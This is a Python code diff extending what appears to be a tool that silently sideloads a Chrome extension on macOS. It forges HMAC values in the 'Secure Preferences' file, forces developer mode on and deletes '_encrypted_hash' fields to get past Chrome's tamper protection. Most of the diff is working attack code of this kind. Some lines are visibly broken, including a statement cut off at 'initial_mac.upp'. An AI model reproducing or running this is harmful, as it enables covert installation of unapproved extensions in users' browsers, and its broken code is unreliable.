@@ -161,6 +161,33 @@ def get_extension_id(path):
     print("Using ExtID: {}".format(EXTID))
     return EXTID
 
+def remove_keys_containing(obj, substring):
+    """Recursively removes keys containing a specific substring from a dict or list."""
+    if isinstance(obj, dict):
+        # Identify keys to delete; list(obj.keys()) prevents 'dictionary changed size' error
+        keys_to_delete = [k for k in obj.keys() if substring in k]
+        for k in keys_to_delete:
+            del obj[k]
+        
+        # Recurse into remaining dictionary values
+        for v in obj.values():
+            remove_keys_containing(v, substring)
+            
+    elif isinstance(obj, list):
+        # Recurse into items within a list
+        for item in obj:
+            remove_keys_containing(item, substring)
+
+def clean_json_file(input_path, output_path, substring):
+    """Loads JSON, cleans keys, and writes back to a file."""
+    with open(input_path, 'r') as f:
+        data = json.load(f)
+    
+    remove_keys_containing(data, substring)
+    
+    with open(output_path, 'w') as f:
+        json.dump(data, f, indent=4)
+
 def add_extension():
     
     extension_path = "/your/path/here" #change this to point to your extension path
@@ -212,6 +239,37 @@ def add_extension():
     #add macs to json file
     data["protection"]["macs"]["extensions"]["settings"][random_ext_str]=macs
 
+    #deal with signed in accounts
+    print("Checking if signed in account, setting developer mode to true if it is...")
+    try:
+        data["account_values"]["extensions"]["ui"]["developer_mode"]=True
+        print("User is signed in, added extra field!")
+    except KeyError:
+        print("No signed in account! Adding proper fields")
+        #data["account_values"].setdefault("extensions", OrderedDict())
+        # now insert your empty OrderedDict into developer_mode
+        data.setdefault("account_values", OrderedDict())
+        data["account_values"].setdefault("extensions", OrderedDict())
+        data["account_values"]["extensions"].setdefault("ui", OrderedDict())
+        data["account_values"]["extensions"]["ui"].setdefault("developer_mode", OrderedDict())
+        data["account_values"]["extensions"]["ui"]["developer_mode"] = OrderedDict()
+        data["account_values"]["extensions"]["ui"]["developer_mode"]= True
+
+    #if this exists, now you need to deal with second value:
+    try:
+        initial_pref_path = "account_values.extensions.ui.developer_mode"
+        initial_pref_value = True
+        initial_mac = calculate_chrome_dev_mac(seed, sid, initial_pref_path, initial_pref_value)
+        data["protection"]["macs"]["account_values"]["extensions"]["ui"]["developer_mode"] = initial_mac.upper()
+        print("Initial mac is: ", initial_mac.upper())
+    except KeyError:
+        print("Account signed in but fields wrong for developer mode protection key")
+        initial_pref_path = "account_values.extensions.ui.developer_mode"
+        initial_pref_value = True
+        initial_mac = calculate_chrome_dev_mac(seed, sid, initial_pref_path, initial_pref_value)
+        data["protection"]["macs"].setdefault("account_values")
+        data["protection"]["macs"]["account_values"]["extensions"]["ui"]["developer_mode"] = OrderedDict()
+        data["protection"]["macs"]["account_values"]["extensions"]["ui"]["developer_mode"] = initial_mac.upp
     #set dev mode to true
     try:
         data["extensions"]["ui"]["developer_mode"]=True
@@ -256,6 +314,9 @@ def add_extension():
     with open(filepath, 'w') as z:
             z.write(newdata)
     z.close()
+
+    #remove fields to allow developer mode to be turned on
+    clean_json_file('/Users/{}/Library/Application Support/Google/Chrome/Default/Secure Preferences'.format(username), '/Users/{}/Library/Application Support/Google/Chrome/Default/Secure Preferences'.format(username), '_encrypted_hash')
 
 if __name__ == "__main__":
     add_extension()
